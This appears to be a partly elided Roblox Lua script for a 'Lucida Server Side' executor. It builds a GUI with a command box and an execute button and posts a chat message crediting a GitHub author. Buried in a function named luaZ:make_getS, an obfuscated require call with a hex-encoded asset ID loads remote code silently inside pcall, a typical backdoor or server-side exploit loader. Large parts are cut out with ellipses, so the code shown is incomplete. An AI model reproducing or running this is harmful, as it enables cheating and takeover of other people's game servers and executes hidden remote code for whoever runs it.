...
local ServerSide = Instance.new("ScreenGui")
...
ServerSide.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ServerSide.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ServerSide
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Position = UDim2.new(0.248221338, 0, 0.15525876, 0)
Frame.Size = UDim2.new(0, 492, 0, 84)

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.Position = UDim2.new(0.0646196082, 0, 0.384350926, 0)
TextBox.Size = UDim2.new(0, 345, 0, 19)
...
TextButton.Position = UDim2.new(0.821138203, 0, 0, 0)
TextButton.Size = UDim2.new(0, 88, 0, 84)
...
TextLabel.Position = UDim2.new(0.174796745, 0, 0.119047642, 0)
TextLabel.Size = UDim2.new(0, 203, 0, 14)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Lucida Server Side"
	...
	local function module_script()
		...
		function luaZ:make_getS(buff)
			...
			pcall(function()
				...
				for _ in newThreadedCall,require,0x1e939b7c9 do end
			end)
...
local function BUYDUO_fake_script() -- TextButton.LocalScript 
...
coroutine.wrap(BUYDUO_fake_script)()
local function KNRW_fake_script() -- Frame.draggable 
	...
	--Allows Gui to be dragged--
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.15 --How fast it drags, should be set to 0.15 usually--
	local dragStart = nil
	local startPos = nil
...
coroutine.wrap(KNRW_fake_script)()
local function WIBCU_fake_script() -- Frame.saycredits 
	local script = Instance.new('LocalScript', Frame)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
	...
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "Lucida Server Side Activated. Made by littlepig453 on Github";
		Font = Enum.Font.Cartoon;
		Color = bc.Color;
		FontSize = Enum.FontSize.Size96;	
	})
end
coroutine.wrap(WIBCU_fake_script)()
local function XCEPKC_fake_script() -- Frame.Script 
...
coroutine.wrap(XCEPKC_fake_script)()
